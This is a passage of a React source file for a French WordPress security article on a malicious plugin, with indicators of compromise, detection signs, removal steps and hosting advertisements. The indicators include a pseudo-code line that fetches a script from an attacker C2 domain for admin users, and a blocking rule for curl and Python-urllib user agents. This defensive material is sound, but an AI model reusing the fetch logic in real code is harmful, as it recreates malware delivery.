                  Détails Techniques du Malware
                </h2>

                <div className="grid md:grid-cols-2 gap-6">
                  <Card>
                    <CardHeader>
                      <CardTitle className="flex items-center gap-2 text-lg">
                        <Target className="w-5 h-5 text-red-500" />
                        Conditions de Déclenchement
                      </CardTitle>
                    </CardHeader>
                    <CardContent className="space-y-3">
                      <div className="flex items-center gap-2">
                        <CheckCircle className="w-4 h-4 text-red-500" />
                        <span>Utilisateur avec droits <code className="bg-muted px-1 rounded">manage_options</code></span>
                      </div>
                      <div className="flex items-center gap-2">
                        <CheckCircle className="w-4 h-4 text-red-500" />
                        <span>User-Agent indiquant Windows</span>
                      </div>
                      <div className="flex items-center gap-2">
                        <CheckCircle className="w-4 h-4 text-red-500" />
                        <span>Navigation dans <code className="bg-muted px-1 rounded">/wp-admin/</code></span>
                      </div>
                    </CardContent>
                  </Card>

                  <Card>
                    <CardHeader>
                      <CardTitle className="flex items-center gap-2 text-lg">
                        <Server className="w-5 h-5 text-orange-500" />
                        Infrastructure C2
                      </CardTitle>
                    </CardHeader>
                    <CardContent className="space-y-3">
                      <div className="flex items-center gap-2">
                        <XCircle className="w-4 h-4 text-red-500" />
                        <span>Domaine : <code className="bg-red-500/10 text-red-400 px-1 rounded">persistancejs.store</code></span>
                      </div>
                      <div className="flex items-center gap-2">
                        <RefreshCw className="w-4 h-4 text-orange-500" />
                        <span>Mécanisme d'auto-mise à jour</span>
                      </div>
                      <div className="flex items-center gap-2">
                        <Trash2 className="w-4 h-4 text-yellow-500" />
                        <span>Capacité d'auto-destruction</span>
                      </div>
                    </CardContent>
                  </Card>
                </div>

                <Card className="mt-8 border-orange-500/30 bg-orange-500/5">
                  <CardContent className="py-6">
                    <h3 className="font-bold text-lg mb-4 flex items-center gap-2">
                      <AlertCircle className="w-5 h-5 text-orange-500" />
                      Types de Malwares Déployés
                    </h3>
                    <div className="grid md:grid-cols-3 gap-4">
                      <div className="p-4 bg-background rounded-lg border">
                        <h4 className="font-semibold text-red-500 mb-2">Ransomware</h4>
                        <p className="text-sm text-muted-foreground">Chiffre vos fichiers et demande une rançon en Bitcoin pour les récupérer</p>
                      </div>
                      <div className="p-4 bg-background rounded-lg border">
                        <h4 className="font-semibold text-orange-500 mb-2">RAT (Trojan)</h4>
                        <p className="text-sm text-muted-foreground">Donne un contrôle total de votre machine à l'attaquant à distance</p>
                      </div>
                      <div className="p-4 bg-background rounded-lg border">
                        <h4 className="font-semibold text-yellow-500 mb-2">Info Stealer</h4>
                        <p className="text-sm text-muted-foreground">Vole vos mots de passe, cookies de session et données bancaires</p>
                      </div>
                    </div>
                  </CardContent>
                </Card>
              </div>
            </div>
          </section>

          {/* Malicious Code Indicators */}
          <section className="py-16">
            <div className="container mx-auto px-4">
              <div className="max-w-4xl mx-auto">
                <h2 className="text-2xl md:text-3xl font-bold mb-8 flex items-center gap-3">
                  <AlertTriangle className="w-8 h-8 text-red-500" />
                  Indicateurs de Malveillance Détectés
                </h2>

                <div className="space-y-6">
                  <VulnerableCodeDisplay
                    label="persistancejs.store"
                    description="Domaine de commande et contrôle (C2) utilisé par les attaquants pour télécharger et contrôler le malware à distance. Ce domaine suspect se contacte régulièrement pour recevoir des instructions."
                  />

                  <VulnerableCodeDisplay
                    label="wp-content/plugins/modern-recent-posts/"
                    description="Dossier du plugin malveillant qui contient le code d'injection JavaScript. Une fois supprimé, l'attaque ne peut plus se déployer. Ce plugin ne fait pas partie des plugins WordPress officiels reconnus."
                  />

                  <VulnerableCodeDisplay
                    label="Python-urllib / curl"
                    description="Outils détectés dans les requêtes HTTP suspectes provenant du serveur. Utilisés par le malware pour télécharger les payloads malveillants et communiquer avec le serveur C2. Toute connexion avec ces User-Agents doit être bloquée."
                  />

                  <VulnerableCodeDisplay
                    label="if (current_user_can('manage_options')) { fetch('persistancejs.store/js/update.js'); }"
                    description="Pseudo-code montrant la logique du malware. Il vérifie si l'utilisateur actuel est administrateur (manage_options), puis télécharge un script malveillant depuis persistancejs.store. C'est le vecteur principal d'infection."
                  />
                </div>
              </div>
            </div>
          </section>

          {/* Detection Signs */}
          <section id="detection" className="py-16">
            <div className="container mx-auto px-4">
              <div className="max-w-4xl mx-auto">
                <h2 className="text-2xl md:text-3xl font-bold mb-8 flex items-center gap-3">
                  <Search className="w-8 h-8 text-yellow-500" />
                  Comment Détecter l'Infection
                </h2>

                <div className="space-y-4">
                  {DETECTION_SIGNS.map((item, index) => (
                    <Card key={index} className={item.critical ? "border-red-500/50" : "border-border/50"}>
                      <CardContent className="py-4 flex items-start gap-4">
                        <div className={`flex-shrink-0 w-8 h-8 rounded-full flex items-center justify-center ${item.critical ? 'bg-red-500/10' : 'bg-yellow-500/10'}`}>
                          {item.critical ? (
                            <AlertTriangle className="w-4 h-4 text-red-500" />
                          ) : (
                            <Eye className="w-4 h-4 text-yellow-500" />
                          )}
                        </div>
                        <div>
                          <h3 className="font-semibold flex items-center gap-2">
                            {item.sign}
                            {item.critical && (
                              <Badge variant="destructive" className="text-xs">CRITIQUE</Badge>
                            )}
                          </h3>
                          <p className="text-muted-foreground text-sm mt-1">{item.description}</p>
                        </div>
                      </CardContent>
                    </Card>
                  ))}
                </div>
              </div>
            </div>
          </section>

          {/* Protection Section */}
          <section id="protection" className="py-16 bg-gradient-to-br from-primary/5 to-green-500/5">
            <div className="container mx-auto px-4">
              <div className="max-w-4xl mx-auto">
                <h2 className="text-2xl md:text-3xl font-bold mb-8 flex items-center gap-3">
                  <ShieldCheck className="w-8 h-8 text-green-500" />
                  Comment se Protéger
                </h2>

                <div className="grid md:grid-cols-2 gap-6 mb-12">
                  <Card className="border-green-500/30">
                    <CardHeader>
                      <CardTitle className="text-lg flex items-center gap-2">
                        <Shield className="w-5 h-5 text-green-500" />
                        Actions Immédiates
                      </CardTitle>
                    </CardHeader>
                    <CardContent className="space-y-3">
                      <div className="flex items-start gap-2">
                        <CheckCircle className="w-4 h-4 text-green-500 mt-1" />
                        <span>Auditez tous les plugins installés - supprimez ceux non reconnus</span>
                      </div>
                      <div className="flex items-start gap-2">
                        <CheckCircle className="w-4 h-4 text-green-500 mt-1" />
                        <span>Vérifiez les comptes utilisateurs avec droits admin</span>
                      </div>
                      <div className="flex items-start gap-2">
                        <CheckCircle className="w-4 h-4 text-green-500 mt-1" />
                        <span>Changez tous les mots de passe (WordPress, FTP, base de données)</span>
                      </div>
                      <div className="flex items-start gap-2">
                        <CheckCircle className="w-4 h-4 text-green-500 mt-1" />
                        <span>Scannez votre ordinateur si vous avez cliqué sur une alerte</span>
                      </div>
                    </CardContent>
                  </Card>

                  <Card className="border-primary/30">
                    <CardHeader>
                      <CardTitle className="text-lg flex items-center gap-2">
                        <Lock className="w-5 h-5 text-primary" />
                        Protection Continue
                      </CardTitle>
                    </CardHeader>
                    <CardContent className="space-y-3">
                      <div className="flex items-start gap-2">
                        <CheckCircle className="w-4 h-4 text-primary mt-1" />
                        <span>Activez l'authentification à deux facteurs (2FA)</span>
                      </div>
                      <div className="flex items-start gap-2">
                        <CheckCircle className="w-4 h-4 text-primary mt-1" />
                        <span>Installez un WAF (Web Application Firewall)</span>
                      </div>
                      <div className="flex items-start gap-2">
                        <CheckCircle className="w-4 h-4 text-primary mt-1" />
                        <span>Maintenez WordPress, thèmes et plugins à jour</span>
                      </div>
                      <div className="flex items-start gap-2">
                        <CheckCircle className="w-4 h-4 text-primary mt-1" />
                        <span>Surveillez le trafic sortant vers des domaines suspects</span>
                      </div>
                    </CardContent>
                  </Card>
                </div>

                {/* Kinsta CTA */}
                <Card className="bg-gradient-to-r from-primary/10 via-primary/5 to-green-500/10 border-primary/30">
                  <CardContent className="py-8">
                    <div className="text-center">
                      <h3 className="text-2xl font-bold mb-4">
                        Protégez votre WordPress avec Kinsta
                      </h3>
                      <p className="text-muted-foreground mb-6 max-w-2xl mx-auto">
                        Kinsta offre une protection multicouche contre les malwares : pare-feu applicatif, 
                        détection en temps réel, sauvegardes automatiques et équipe de sécurité 24/7. 
                        Ne laissez pas les plugins malveillants compromettre votre business.
                      </p>
                      <Button 
                        size="lg" 
                        onClick={() => handleCTAClick('protection_section')}
                        className="bg-primary hover:bg-primary/90"
                        data-testid="cta-protection-kinsta"
                      >
                        Découvrir la Protection Kinsta
                        <ArrowRight className="ml-2 w-5 h-5" />
                      </Button>
                    </div>
                  </CardContent>
                </Card>
              </div>
            </div>
          </section>

          {/* Removal Guide */}
          <section className="py-16">
            <div className="container mx-auto px-4">
              <div className="max-w-4xl mx-auto">
                <h2 className="text-2xl md:text-3xl font-bold mb-8 flex items-center gap-3">
                  <Trash2 className="w-8 h-8 text-red-500" />
                  Guide de Suppression Complet
                </h2>

                <RemediationSteps steps={REMEDIATION_STEPS} />
              </div>

              <SocialShare 
                url="https://wp-vitesse-pro.fr/article/malware-wordpress-plugin-2026" 
                title={ARTICLE_DATA.title} 
              />
            </div>
          </section>

          {/* Final CTA */}
          <section className="py-16 bg-gradient-to-r from-primary/10 to-red-500/10">
            <div className="container mx-auto px-4">
              <div className="max-w-3xl mx-auto text-center">
                <ShieldAlert className="w-16 h-16 mx-auto mb-6 text-primary" />
                <h2 className="text-2xl md:text-3xl font-bold mb-4">
                  Ne Prenez Plus de Risques avec Votre WordPress
                </h2>
                <p className="text-lg text-muted-foreground mb-8">
                  Les attaques par plugins malveillants sont en augmentation. Migrez vers un hébergement 
                  qui prend la sécurité au sérieux avec une protection proactive incluse.
                </p>
                <Button 
                  size="lg" 
                  onClick={() => handleCTAClick('final_cta')}
                  className="bg-primary hover:bg-primary/90"
                  data-testid="cta-final-kinsta"
                >
                  Sécurisez Votre Site avec Kinsta
                  <ExternalLink className="ml-2 w-5 h-5" />
                </Button>
              </div>
            </div>
          </section>

          {/* Related Articles */}
          <section className="py-12 bg-muted/20">
            <div className="container mx-auto px-4">
              <div className="max-w-4xl mx-auto">
                <h2 className="text-xl font-bold mb-6">Articles Connexes</h2>
                <div className="grid md:grid-cols-2 gap-4">
                  <Link href="/article/phishing-linkedin-2026">
                    <Card className="hover-elevate cursor-pointer h-full">
                      <CardContent className="py-4">
                        <Badge variant="outline" className="mb-2">Cybersécurité</Badge>
                        <h3 className="font-semibold mb-2">Alerte Phishing LinkedIn 2026</h3>
                        <p className="text-sm text-muted-foreground">4,3 milliards de données volées, comment vous protéger</p>
                      </CardContent>
                    </Card>
                  </Link>
                  <Link href="/article/vulnerabilites-wordpress-2026">
                    <Card className="hover-elevate cursor-pointer h-full">
                      <CardContent className="py-4">
                        <Badge variant="outline" className="mb-2">WordPress</Badge>
                        <h3 className="font-semibold mb-2">Vulnérabilités WordPress 2026</h3>
                        <p className="text-sm text-muted-foreground">Les failles critiques à surveiller cette année</p>
                      </CardContent>
                    </Card>
                  </Link>
                </div>
              </div>
            </div>
          </section>
        </article>
      </main>

      <SEOFooter />
    </>
  );
}
